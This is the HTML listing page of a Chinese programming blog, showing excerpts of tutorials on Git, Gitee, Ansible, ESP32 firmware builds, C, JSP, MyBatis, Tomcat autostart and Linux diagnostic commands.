<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a72ea2200b5cfd0ab21805299fc728a/" rel="bookmark">
			每日学习总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习总结
2023年7月29日
1、复习“C语言程序设计”1，2，3，4，5，6，7小节；
2、快捷键：Ctrl+k+d 整理格式化；
3、代码注释：①段注释② 行注释
4、int main() 中return(0)可以省略；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b23103ed74fbb85a788acc741e783eb4/" rel="bookmark">
			手把手一起上传本地项目至Gitee仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Gitee新建仓库 创建自己的Gitee账号，新建仓库，如图所示：
根据自己的项目情况，填写仓库信息，如图所示：
仓库创建完成，如图所示：
2、下载Git 下载地址可用链接: https://registry.npmmirror.com/binary.html?path=git-for-windows/
链接来源此博客
打开链接，如图所示，选择最新版本进入：
选择Git-2.41.0.3-64-bit.exe下载：
3、Git安装 双击下载的Git-2.41.0.3-64-bit.exe，开始安装，点击Next，如图：
选择安装目录，点击Next，如图：
根据个人需求勾选，然后Next，如图：
下图可直接点击Next：
选择Git默认编辑器，默认是Vim，可以直接Next：
下图，选择第一个即可，让Git自己选择，名字是master：
调整path环境变量，选择如图，然后点击Next：
选择SSH执行文件，如图：
选择HTTPS后端传输，如图：
配置行尾符号转换，如图，然后点击Next：
配置终端模拟器以与 Git Bash 一起使用，选择如图：
选择默认的 git pull 行为，如图所示：
选择一个凭证帮助程序，默认即可，点击Next：
配置额外的选项，勾选后，点击Next：
配置实验性选项，无需选择，如图：
然后开始安装：
安装完成：
4、本地项目上传Gitee仓库 进入需要上传的本地项目文件目录，右键单击空白处，点击Git Bash Here，这里随便上传一个文件，如图：
设置用户名，这里的用户名需要和 Gitee 用户名相同，设置命令为
git config --global user.name 用户名 如图所示：
查看是否配置成功，命令如下
git config user.name 如图所示，配置成功：
设置用户名，这里的邮箱需要和 Gitee 绑定的邮箱相同，设置命令为
git config --global user.email 邮箱 如图所示：
设置 SSH 公钥，避免每次上传都需要输入密码，这里最终没有成功，可能原因：公司网络限制，生成公钥命令
$ ssh-keygen -t rsa -C 邮箱 如图所示，生成成功：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b23103ed74fbb85a788acc741e783eb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e576047ae509e55d8e86f36d730caf4/" rel="bookmark">
			正则表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现一个非常棒的正则表达式工具：
🔥🔥非常棒🔥🔥 包含常用正则表达式大全、正则表达式生成器、正则表达式可视化、正则表达式测试以及基础语法说明。最重要的是界面简洁、大方。
先看看界面
可视化解释： Begin! 和 End! 分别代表开始(^)和结束($)。
Group #1 表示第一个捕获组(capturing group)。
q|z|x|d|p 代表捕获组中允许有 q 或 z 或 x 或 d 或 p。
最下方的 0 or more times 表示允许该捕获组出现0或多次。
下面红色虚线表示非贪婪模式(non-greedy，由 ? 表达)，如果是贪婪模式，将会是红色实线。
特殊字符： 所谓特殊字符，就是一些有特殊含义的字符，如上面说的 qzx*p 中的 ，简单的说就是表示任何字符串的意思。如果要查找字符串中的 * 符号，则需要对 * 进行转义，即在其前加一个 \，qzx*p 匹配字符串 qzxp。
许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符"转义"，即，将反斜杠字符 \ 放在它们前面。下表列出了正则表达式中的特殊字符：
字符说明$匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。( )标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。*匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。+匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2e576047ae509e55d8e86f36d730caf4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9b918b8aedfcfabb427b0ce16291050/" rel="bookmark">
			【计算机网络】第 4 课 - 物理层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎来到博主 Apeiron 的博客，祝您旅程愉快 ！ 时止则止，时行则行。动静不失其时，其道光明。
目录
1、物理层的基本概念
2、物理层协议的主要任务 3、物理层任务
4、总结 1、物理层的基本概念 在计算机网络中，用来连接各种网络设备的传输媒体种类众多。大至可以分为两类，一类是 导引型传输媒体，另一类是 非导引型传输媒体。
导引型传输媒体
① 双绞线
② 同轴电缆
③ 光纤 非导引型传输媒体
① 微波通信（2~40 GHz） ② 2.4 GHz 和 5.8 GHz 频段的 WiFi
计算机网络体系结构中的物理层，就是 要解决在各种传输媒体上传输比特 0 和 1 的问题，进而给数据链路层提供透明传输比特流的服务。所谓 “透明”，是指数据链路层看不见，也无需看见物理层究竟使用的是什么方法来传输比特 0 和 1 的。它只管享受物理层提供的比特流传输服务即可。
2、物理层协议的主要任务 物理层为了解决在各种传输媒体上传输比特 0 和 1 的问题，主要有以下四个任务。
① 机械特性
指明接口所用接线器的 形状 和 尺寸、引脚数目 和 排列、固定 和 锁定 装置。 ② 电气特性
指明在接口电缆的各条线上出现的 电压的范围。 ③ 功能特性
指明某条线上出现的某一电平的 电压表示何种意义。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9b918b8aedfcfabb427b0ce16291050/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eed95f87e7597ca1fa19b02a4b0273ae/" rel="bookmark">
			Git 版本管理使用-介绍-示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Git是一种版本控制工具，它可以帮助程序员组织和管理代码的变更历史Git的使用方式：常见命令安装Git软件第一次上传分支删除分支 Git是一种版本控制工具，它可以帮助程序员组织和管理代码的变更历史 以下是Git的基本概念和使用方式：
仓库（Repository）：Git使用仓库来存储代码的历史变更记录，包括所有的代码文件和版本信息。一个Git仓库可以存储在本地计算机或者远程服务器上。
分支（Branch）：Git允许程序员在同一个仓库中创建多个不同的分支，每个分支可以包含不同版本的代码。程序员可以在不同的分支上进行开发和实验，最终将不同分支的代码合并起来。
提交（Commit）：Git的基本单位是提交（Commit），每次提交是对代码的一个修改或一系列修改的快照。每个提交都包含一个唯一的标识符，以及提交者、提交时间等元数据。
拉取（Pull）：Git允许程序员从远程仓库中拉取代码到本地计算机上，以便查看和修改代码。使用拉取功能需要先连接到远程仓库并获取访问权限。
推送（Push）：若要将本地的代码更改推送到远程仓库，程序员需要使用推送功能。推送将所有本地的提交上传到远程仓库中。
合并（Merge）：当两个分支的代码有冲突时，程序员可以使用合并（Merge）来将两个分支的代码合并在一起。合并时需要解决冲突，保留两个分支的代码。
标签（Tag）：Git允许程序员对代码仓库中的某个版本打上标签。标签一般用于标识一个版本或者某个重要的里程碑，以便于查找和回溯。
Git的使用方式： 首先在本地计算机或者远程服务器上创建一个新的Git仓库；将代码文件添加到仓库中；使用提交功能将代码文件的修改保存到仓库中；使用分支功能在同一个仓库中创建多个不同的分支，进行开发和实验；使用拉取和推送功能连接到远程仓库，并将代码从本地推送到远程仓库；使用合并功能将不同分支的代码合并到一起；使用标签功能打上标签，以便于查找和回溯。 常见命令 创建仓库
git init 初始化仓库
git clone 拷贝一份远程仓库，也就是下载一个项目。
提交与修改
git add 添加文件到仓库
git status 查看仓库当前的状态，显示有变更的文件。
git diff 比较文件的不同，即暂存区和工作区的差异。
git commit 提交暂存区到本地仓库。
git reset 回退版本。
git rm 删除工作区文件。
git mv 移动或重命名工作区文件。
提交日志
git log 查看历史提交记录
git blame 以列表形式查看指定文件的历史修改记录
远程操作
git remote 远程仓库操作
git fetch 从远程获取代码库
git pull 下载远程代码并合并
git push 上传远程代码并合并
安装Git软件 去这里下载Git下载地址，选择你需要的版本下载安装即可；
安装完后你可以直接打开利用指令进入你的项目；或者在你的项目目录里，右键选择Git Bash Here打开
打开将你的用户名，邮箱配置了，这是个全局配置，会把所有这个电脑上的仓库都写上，当然你可以针对某个仓库设不同的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eed95f87e7597ca1fa19b02a4b0273ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8c55c8ccf874c89f733004fbed40efc/" rel="bookmark">
			Ansible的脚本 --- playbook 剧本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、playbook剧本的组成创建剧本运行playbook二、定义、引用变量三、指定远程主机sudo切换用户四、when条件判断五、迭代Templates 模块tags 模块 一、playbook剧本的组成 playbooks 本身由以下各部分组成
（1）Tasks：任务，即通过 task 调用 ansible 的模板将多个操作组织在一个 playbook 中运行
（2）Variables：变量
（3）Templates：模板
（4）Handlers：处理器，当changed状态条件满足时，（notify）触发执行的操作
（5）Roles：角色
创建剧本 vim test1.yaml --- #yaml文件以---开头，以表明这是一个yaml文件，可省略 - name: first play #定义一个play的名称，可省略 gather_facts: false #设置不进行facts信息收集，这可以加快执行速度，可省略 hosts: webservers #指定要执行任务的被管理主机组，如多个主机组用冒号分隔 remote_user: root #指定被管理主机上执行任务的用户 tasks: #定义任务列表，任务列表中的各任务按次序逐个在hosts中指定的主机上执行 - name: test connection #自定义任务名称 ping: #使用 module: [options] 格式来定义一个任务 - name: disable selinux command: '/sbin/setenforce 0' #command模块和shell模块无需使用key=value格式 ignore_errors: True #如执行命令的返回值不为0，就会报错，tasks停止，可使用ignore_errors忽略失败的任务 - name: disable firewalld service: name=firewalld state=stopped #使用 module: options 格式来定义任务，option使用key=value格式 - name: install httpd yum: name=httpd state=latest - name: install configuration file for httpd copy: src=/opt/httpd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a8c55c8ccf874c89f733004fbed40efc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd72f9b852eb574bf4b19e6f3e19383e/" rel="bookmark">
			ESP32 官方AT固件编译（从零开始环境搭建到编译完成全过程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载VMware免费版 https://download3.vmware.com/software/WKST-PLAYER-1702/VMware-player-full-17.0.2-21581411.exe
2、下载Ubuntu （ubuntu-22.04.2-desktop-amd64.iso）** https://releases.ubuntu.com/jammy/ubuntu-22.04.2-desktop-amd64.iso
3、安装VMware与Ubuntu虚拟机 可能需要进电脑的BIOS打开一个选项才能安装成功虚拟机
4、ctrl+alt+t打开控制台 安装git 5、获取AT固件源文件 5.1 GIT 克隆 git clone --recursive https://github.com/espressif/esp-at.git
如果没有安装git，按照控制台的提示安装git即可
5.2 AT固件切换版本到发布版本 下载gitg
然后切换AT固件到一个比较稳定的发布版本
6、在esp-at文件夹下，下载安装esp-idf 依次操作
克隆
git clone -b release/v5.0 --recursive https://github.com/espressif/esp-idf.git 进入esp-idf文件夹切换下载地址为乐鑫
export IDF_GITHUB_ASSETS=“dl.espressif.com/github_assets” 下载安装工具链
sudo ./install.sh 设置环境变量
. ./export.sh 设置环境变量可能会遇到这个报错：ModuleNotFoundError: No module named ‘xlrd’
只需要输入pip install xlrd 即可
7、编译AT固件 进入esp-at文件夹
依次操作
配置工程，期间会让你选择芯片型号，并更新idf
./build.py menuconfig 编译
./build.py build 截图里就是编译成功的画面，记录好bin文件里的地址信息，烧录的时候需要用到
8、转移虚拟机编译好的固件到windows电脑 参考
https://blog.csdn.net/qq_44177918/article/details/129191160
9、过程中常见问题的解决 cmake未安装：cmake" must be available on the PATH to use idf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fd72f9b852eb574bf4b19e6f3e19383e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcb20266574dd9987813f60ff9be173e/" rel="bookmark">
			VSCode配置之C&#43;&#43; &amp; SQLite3极简配置方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景
最近在学习《深入应用C++11: 代码优化与工程级应用》，其中第13章说到SQLite库，查询网上诸多教程，发现比较容易出现bug且配置较为麻烦，故记录此次简化版方案，以供参考。
软件环境
SQLite 3.42.0 版本（仅下载Source code即可）
VSCode+CMake+SQLite Viewer
VSCode + SQLite文件目录
（注：仅需左侧红色框内容，其余均为编译生成结果）
测试代码
#include&lt;iostream&gt; #include&lt;string&gt; #include"sqlite3.h" using namespace std; bool test_sqlite() { sqlite3* db_handle = nullptr; int result = sqlite3_open("test.db", &amp;db_handle); if(result != SQLITE_OK) { sqlite3_close(db_handle); return false; } // create table const char* sql_create = "CREATE TABLE if not exists personTable(ID INTEGER NOT NULL, Name Text, Address Text);"; result = sqlite3_exec(db_handle, sql_create, nullptr, nullptr, nullptr); // insert data // create stmt sqlite3_stmt* stmt = nullptr; const char* sql_insert = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fcb20266574dd9987813f60ff9be173e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66ab0ac469021939662b9152b8057cb3/" rel="bookmark">
			VMware Linux 可视化增加磁盘
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、VMware 增加磁盘
2、disks挂载磁盘
此处我挂载的是20G磁盘，截图只是用5G的做过程演示例子。
3、验证挂载磁盘
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4610a3c688f25a5cd831f054ad6a9fc/" rel="bookmark">
			泛型单例模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		using System.Collections; using System.Collections.Generic; using UnityEngine; public class SingleTon&lt;T&gt; : MonoBehaviour where T:SingleTon&lt;T&gt; { private static T instance; public static T Instance { get { return instance; } } protected virtual void Awake() { if (instance == null) { instance = (T)this; }else if (instance != this) { Destroy(this.gameObject); } } protected virtual void OnDestry() { if (instance == this) instance = null; } public bool IsInitialized { get { return instance !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b4610a3c688f25a5cd831f054ad6a9fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e226824932a39c4ca9719592df86ce7d/" rel="bookmark">
			P5724 【深基4.习5】求极差 / 最大跨度值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 给出 n n n 和 n n n 个整数 a i a_i ai​，求这 n n n 个整数中的极差是什么。极差的意思是一组数中的最大值减去最小值的差。
输入格式 第一行输入一个正整数 n n n，表示整数个数。
第二行输入 n n n 个整数 a 1 , a 2 … a n a_1,a_2 \dots a_n a1​,a2​…an​，以空格隔开。
输出格式 输出一个整数，表示这 n n n 个整数的极差。
1.题目分析 将整数存入数组，直接升序排序后，打印最大索引减最小索引的值即可。
排序的方式有很多，这里用最简单的冒泡排序。
2.题目思路 写一个冒泡排序的函数，键入数据到数组后，直接调用，打印，完。
当然不写函数也是可以的，函数的目的是只是为了提高代码的复用性。
3.代码实现 #include &lt;stdio.h&gt; //冒泡排序 void BubbleSort(int *p, int len) { int temp; for (int i = 0; i &lt; len - 1; ++i) { for (int j = 0; j &lt; len - i - 1; ++j) { if (p[j] &gt; p[j + 1]) { temp = p[j]; p[j] = p[j + 1]; p[j + 1] = temp; } } } } int main() { int n, a; int arr[100]; scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e226824932a39c4ca9719592df86ce7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f1d926c7935dc78d43e02fba76055b1/" rel="bookmark">
			Stripe Checkout is not able to run in an iFrame. Please redirect to Checkout at the top level.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现场景：uniapp使用stripe支付跳转到第三方
解决：换一种跳转方式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2500b453b892b9bcdb5d84f3a1fd9c2/" rel="bookmark">
			JSP中的页面转发标签（Forward）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在JSP中，页面转发是一种常用的页面跳转方式，它允许将请求从一个JSP页面转发到另一个JSP页面或Servlet，从而实现页面之间的数据共享和流程控制。JSP中实现转发的标签是&lt;jsp:forward&gt;
什么是JSP页面转发？ JSP页面转发是一种在服务器端完成的页面跳转方式，对客户端浏览器是透明的，即浏览器的URL地址不会改变。它通过 &lt;jsp:forward&gt; 标签指定转发的目标地址，并将请求转发到该地址。转发使得目标页面能够访问原始请求中的数据（例如请求参数、属性等），并且可以在目标页面中处理数据后生成响应。
&lt;jsp:forward&gt; 标签的语法 &lt;jsp:forward page="targetPageURL" /&gt; 其中，page属性指定了转发的目标地址，可以是一个JSP页面或Servlet的相对或绝对URL。如果目标地址是相对URL，它将相对于当前JSP页面进行解析。
示例：实现JSP页面转发 假设有两个JSP页面，source.jsp 和 target.jsp。我们将在 source.jsp 中使用 标签将请求转发到 target.jsp。
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Source JSP&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;This is the source JSP page&lt;/h1&gt; &lt;jsp:forward page="target.jsp" /&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Target JSP&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;This is the target JSP page&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 在这个例子中，当访问 source.jsp 页面时，请求将被转发到 target.jsp 页面，最终页面的内容为 target.jsp 的内容。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68c37cb964558be9d6112a07605528db/" rel="bookmark">
			字符指针变量和字符数组注意事项（区别）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（1）可以对字符指针变量赋值，但不能对数组名赋值 错误写法
char str[14]; str[0]='1'; //对字符数组元素赋值，合法 str="I love you";//数组名是地址，是常量，不能被赋值，非法 正确写法
char *a; a="I love you"; 等价于
char *a="I love you";
(2)对数组的初始化 char str[14]="I love you"; 不等价于
char str[14]; str[]="I love you"; (3)编译时，为字符数组分配若干存储单元，以存放各元素的值，而对字符指针变量，只分配一个存储单元 char *a; scanf("%s",a); 这种做法十分危险，因为编译时给指针变量a分配了存储单元，变量a的地址（&amp;a）是已指定的，但a并未被赋值，a的存储单元是一个不可预料的值。他可能指向内存中空白的用户存储区中，也有可能指向已存放指令或数据的有用内存段，这就会破坏程序或有用数据。
所以正确的写法应为
char *a,str[10]; a=str; scanf("%s",a); 补充：字符指针变量和字符数组的内存分配区别
先来看一段代码
int main() { char arr1[]="abcd"; char arr2[]="abcd"; char *p1="abcd"; char *p2="abcd"; /* if(arr1==arr2) printf("1"); else printf("2"); */ if(p1==p2) printf("1"); else printf("2"); return 0; } 对于arr1==arr2 ？1：2；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68c37cb964558be9d6112a07605528db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57e70e25773fd7f5ee4d9254ed5085e0/" rel="bookmark">
			记录Mybatis中插入数据返回主键id的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当使用的数据库是mysql时，使用使用useGeneratedKeys="true"和keyProperty="roleId"来插入数据后，可以从插入的对象中（插入前没有id值）来获取自动生成的主键ID。这是因为MyBatis会自动将生成的主键ID设置到对象的keyProperty属性对应的字段上，举个例子：
&lt;insert id="insertRole" parameterType="com.migu.cloudgame.commonservice.po.systemmanage.SystemRoleInfo" useGeneratedKeys="true" keyProperty="roleId"&gt; &lt;/insert&gt; 当你执行systemRoleInfoMapper.insertSystemRoleInfo(systemRoleInfo);后，如果数据库中的主键是自动生成的（比如自增长字段），MyBatis会将生成的主键ID回填到systemRoleInfo对象中，所以你可以通过systemRoleInfo.getRoleId()来获取插入后的主键ID。确保keyProperty属性的值和SystemRoleInfo对象中表示主键的属性名一致。
如果使用的是 Oracle 数据库，你可以通过序列（Sequence）来模拟自增主键的功能。首先，你需要在数据库中创建一个序列，然后在插入数据时使用该序列的下一个值作为主键。
1.在 Oracle 数据库中创建序列：
这将创建一个名为 seq_role_id 的序列，从 1 开始，每次递增 1。
2.在 MyBatis 的 Mapper.xml 中配置使用该序列：
&lt;insert id="insertSystemRoleInfo" parameterType="com.migu.cloudgame.commonservice.po.systemmanage.SystemRoleInfo"&gt;
&lt;!-- 使用序列获取主键ID --&gt;
&lt;selectKey keyProperty="roleId" resultType="java.lang.Integer" order="BEFORE"&gt;
SELECT seq_role_id.NEXTVAL FROM DUAL
&lt;/selectKey&gt;
&lt;!-- 插入数据 --&gt;
INSERT INTO CGO_ROLE (ROLE_ID, ROLE_NAME, REMARK, CREATOR, CREATE_DATE, MODIFIER, MODIFY_DATE, STATE)
VALUES (#{roleId}, #{roleName}, #{remark}, #{creator}, #{createDate}, #{modifier}, #{modifyDate}, #{state})
&lt;/insert&gt;
这样配置后，当你执行 systemRoleInfoMapper.insertSystemRoleInfo(systemRoleInfo); 操作时，MyBatis 会先执行 SELECT seq_role_id.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57e70e25773fd7f5ee4d9254ed5085e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f55eab8681fc8a328d92e453ee4548cb/" rel="bookmark">
			tomcat开机自启动 java的jar包、redis、nginx服务实现开机启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、tomcat-windows服务器自启动1.设置文件权限2.加入服务器服务3.tomcat修改配置文件ip为服务器真实ip 二、其他1.其他2.jar包自启动3.redis自启动4.nginx自启动 总结 提示：以下是本篇文章正文内容，下面案例可供参考 一、tomcat-windows服务器自启动 1.设置文件权限 tomcat开机自启服务无法启动的解决办法
第一种：手动启动服务可以，则说明是用户对tomcat的操作权限不够。
解决办法：找到tomcat的安装目录，右键——》属性——》安全——》编辑——》添加
文本框中输入everyone——》确定
选择everyone，下面权限都勾选上，应用，确定，重启系统，tomcat服务自启动成功，问题解决。
第二种：服务手动启动也无法启动。
依赖的jre的路径错误，改为已安装的正确的路径即可。
报错如下：
因为服务启动的本质就是运行tomcat/bin/Tomcat8.exe,这时候查看直接运行Tomcat8.exe也是无法成功的，这时候就要看一下它的配置，即Tomcat8w.exe,双击Tomcat8w.exe打开配置，在Java模块中发现引用的jre路径不存在，这就是问题的根源所在，在你的java安装路径中找到jvm.dll，配置到下面，应用，确定。再运行Tomcat8.exe成功启动tomcat则说明问题已解决。
其实还有第三种情况（我没有遇到）：服务启动了，但又被防火墙关闭了。
这种情况在防火墙中放开对tomcat 8080端口的限制就可以了。
————————————————
版权声明：本文为CSDN博主「一个懒惰的羊」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_23543983/article/details/80868519
2.加入服务器服务 务器设置tomcat开机自启动（cmd命令行语句）
1 找到tomcat安装目录，进入bin/文件夹下面，在此打开windows 命令行窗口。
2 输入
service install tomcatXXX 将tomcat注册成为windows服务，其中tomcatXXX为服务名。
3查看刚刚注册的服务
“我的电脑”-》右键管理
发现刚刚的服务是手动的，并不是自动的，而且无法通过界面修改启动方式。
4 命令行修改启动方式
sc config tomcatXXX start=auto 使用命令行启动服务，在cmd下可有两种方法打开
net和sc。net用于打开没有被禁用的服务,语法是:
启动服务: net start 服务名
停止服务: net stop 服务名
用sc可打开被禁用的服务，语法是:
sc config 服务名start= demand //手动 sc config 服务名start= auto//自动 sc config 服务名start= disabled / /禁用 sc start 服务名 sc stop 服务名 sc delete 删除 5 再次查看，tomcat启动类型已经变为自动。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f55eab8681fc8a328d92e453ee4548cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccba8e1881050bef16a5e8018e8c7919/" rel="bookmark">
			Linux性能检查常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参数： 在Linux系统中，进行检查和诊断时，可以使用许多不同的参数和工具来了解系统的状态、性能和问题。以下是一些常见的参数和工具，供您注意和使用：
1. CPU信息：`lscpu` 命令可以查看CPU的详细信息，例如核心数、频率等。
2. 内存信息：`free` 命令可以查看内存使用情况，包括总内存、已用内存、可用内存等。
3. 磁盘空间：`df` 命令用于显示磁盘分区的空间使用情况。
4. 进程信息：`ps` 命令可以列出当前运行的进程，`top` 命令可以实时显示进程的系统资源使用情况。
5. 网络连接：`netstat` 或 `ss` 命令可以列出当前的网络连接情况。
6. 日志文件：`/var/log/` 目录下存储了系统的各种日志文件，您可以查看这些日志文件以了解系统运行情况和潜在问题。
7. 系统负载：`uptime` 命令可以显示系统的负载情况，即CPU平均负载。
8. 网络性能： `ping` 命令可以测试与其他主机的网络连接，`traceroute` 命令可以跟踪数据包的路径。
9. 硬件信息： `lshw` 或 `lspci` 命令可以获取硬件设备的信息，例如CPU、内存、显卡等。
10. 系统信息：`uname` 命令用于查看系统的基本信息，例如内核版本、操作系统类型等。
11. 系统服务：`systemctl` 命令用于管理系统服务，可以查看服务的状态、启动、停止等。
12. 系统安全：`ufw` 命令用于管理防火墙规则，`fail2ban` 可以保护系统免受暴力破解攻击。
这些是一些常用的参数和工具，用于检查Linux系统的状态和问题。根据您的具体需求和问题，
可能需要使用不同的参数和工具来深入了解和诊断系统。请注意，在进行任何故障排除或更改系统配置之前，务必小心，并确保理解每个命令的作用和潜在影响。
常用命令： 1.lscpu: `lscpu` 命令用于显示关于CPU（中央处理器）的信息，包括CPU架构、型号、核心数、线程数、频率以及缓存等。它在Linux系统中非常有用，可以帮助您了解系统的CPU配置和性能特性。
让我们通过一个具体的示例来解析 `lscpu` 命令的输出：
在终端中运行 `lscpu` 命令：
``` lscpu ``` 输出示例： ``` Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 8 On-line CPU(s) list: 0-7 Thread(s) per core: 2 Core(s) per socket: 4 Socket(s): 1 Vendor ID: GenuineIntel CPU family: 6 Model: 158 Model name: Intel(R) Core(TM) i7-8550U CPU @ 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ccba8e1881050bef16a5e8018e8c7919/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae33d02b6f31627312eed4f75ea2e1b0/" rel="bookmark">
			Centos/Redhat_7.9安装tigervnc
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装tigervnc并配置开机启动用户vnc，修改vnc默认端口
